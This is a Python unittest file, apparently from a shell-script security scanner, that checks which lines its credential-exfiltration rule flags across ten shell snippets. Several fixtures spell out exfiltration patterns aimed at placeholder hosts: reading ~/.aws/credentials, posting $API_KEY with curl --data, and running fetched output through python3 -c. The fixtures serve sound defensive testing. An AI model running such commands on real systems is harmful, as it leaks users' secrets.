"""Source-only numeric response metadata and independent credential flow."""

import unittest
from test_qindun_certify import MODULE

scan = MODULE._shell_flow_findings

CASES = [
    (
        "normal_status",
        'CODE=$(curl -sL -w "%{http_code}" -o /tmp/result.txt -H "Authorization: Bearer ${API_KEY}" https://api.example.invalid)\ncurl --data "$CODE" https://logs.example.invalid',
        [1],
    ),
    (
        "credential_file_request",
        'KEY=$(cat ~/.aws/credentials)\nCODE=$(curl -sL -w "%{http_code}" -o /tmp/result.txt -H "Authorization: Bearer ${KEY}" https://api.example.invalid)\ncurl --data "$CODE" https://logs.example.invalid',
        [2],
    ),
    (
        "mixed_raw_key",
        'KEY="$API_KEY"\nCODE=$(curl -sL -w "%{http_code}" -o /tmp/result.txt https://api.example.invalid)\ncurl --data "$CODE" https://logs.example.invalid\ncurl --data "$KEY" https://other.example.invalid',
        [4],
    ),
    (
        "url_metadata",
        'CODE=$(curl -sL -w "%{url_effective}" -o /tmp/result.txt "https://api.example.invalid?key=$API_KEY")\ncurl --data "$CODE" https://logs.example.invalid',
        [1, 2],
    ),
    (
        "raw_credential_writeout",
        'CODE=$(curl -sL -w "$API_KEY" -o /tmp/result.txt https://api.example.invalid)\ncurl --data "$CODE" https://logs.example.invalid',
        [1, 2],
    ),
    (
        "stdout_body",
        'CODE=$(curl -sL -w "%{http_code}" -o - -H "Authorization: Bearer $API_KEY" https://api.example.invalid)\ncurl --data "$CODE" https://logs.example.invalid',
        [1, 2],
    ),
    (
        "aliased_status",
        'CODE=$(curl -sL -w "%{http_code}" -o /tmp/result.txt -H "Authorization: Bearer ${API_KEY}" https://api.example.invalid)\nCOPY="$CODE"\ncurl --data "$COPY" https://logs.example.invalid',
        [1],
    ),
    (
        "status_overwritten_credential",
        'CODE=$(curl -sL -w "%{http_code}" -o /tmp/result.txt -H "Authorization: Bearer ${API_KEY}" https://api.example.invalid)\nCODE="$API_KEY"\ncurl --data "$CODE" https://logs.example.invalid',
        [1, 3],
    ),
    (
        "decoded_input",
        'INPUT=$(printf eA== | base64 -d)\nCODE=$(curl -s -w "%{http_code}" -o /tmp/result.txt -H "$INPUT" https://api.example.invalid)\npython3 -c "$CODE"',
        [],
    ),
    (
        "credential_input_program",
        'CODE=$(curl -s -w "%{http_code}" -o /tmp/result.txt -H "$API_KEY" https://api.example.invalid)\npython3 -c "$CODE"',
        [1],
    ),
]


class ShellStatusProvenanceTests(unittest.TestCase):
    def test_credentials(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                self.assertEqual(
                    sorted(
                        h.line for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                    ),
                    expected,
                )

    def test_status_is_neither_download_nor_decoded_program(self):
        for name, source, _ in CASES[-2:]:
            with self.subTest(name=name):
                self.assertFalse(
                    {h.rule_id for h in scan("main.sh", source)}
                    & {
                        "QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW",
                        "QINDUN.LOCAL.D3.DECODE_EXECUTION_FLOW",
                    }
                )
